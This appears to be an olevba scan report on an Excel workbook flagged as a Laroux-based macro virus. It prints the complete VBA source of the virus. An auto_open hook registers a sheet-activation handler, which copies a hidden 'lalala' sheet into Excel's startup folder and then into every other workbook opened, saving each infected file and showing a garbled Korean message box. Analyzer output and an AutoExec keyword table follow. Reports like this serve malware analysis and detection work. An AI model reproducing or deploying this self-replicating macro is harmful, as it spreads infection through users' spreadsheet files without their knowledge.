olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-5df4c24e5f21a26d31c367bf056f3a074d6aea05
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO lalala.bas 
in file: Virus.MSExcel.Laroux-based-5df4c24e5f21a26d31c367bf056f3a074d6aea05 - OLE stream: '_VBA_PROJECT_CUR/VBA/lalala'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "files_check"
End Sub

Sub files_check()
Attribute files_check.VB_ProcData.VB_Invoke_Func = " \n14"
    
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "lalala.xls")

    If m$ = "lalala.xls" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    
    whichfile = p + w * 10
    n4$ = ActiveWorkbook.Name
    
    Select Case whichfile
    Case 10
        Application.ScreenUpdating = False
        Sheets("lalala").Visible = True
        Sheets("lalala").Select
        Sheets("lalala").Copy
        With ActiveWorkbook
             .Title = ""
             .Subject = ""
             .Author = ""
             .Keywords = ""
             .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "\" & "lalala.xls"
        ChDir c4$
        Workbooks(n4$).Sheets("lalala").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "lalala.xls!files_check"
        MsgBox "¾Æ´Â °ÍÀÌ ÈûÀÌ´Ï±î, ´Ù°°ÀÌ °øºÎÇÕ½Ã´Ù", , "»ê´Ù´Â °Ç ÁÁÀº°ÅÁö"
     Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "lalala" Then
        Workbooks("lalala.xls").Sheets("lalala").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("lalala").Visible = False
        Else
        End If
        ActiveWorkbook.Save
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "lalala.xls!files_check"
        MsgBox "¾Æ´Â °ÍÀÌ ÈûÀÌ´Ï±î, ´Ù°°ÀÌ °øºÎÇÕ½Ã´Ù", , "»ê´Ù´Â °Ç ÁÁÀº°ÅÁö"
    Case Else
    End Select
    
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  lalal
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

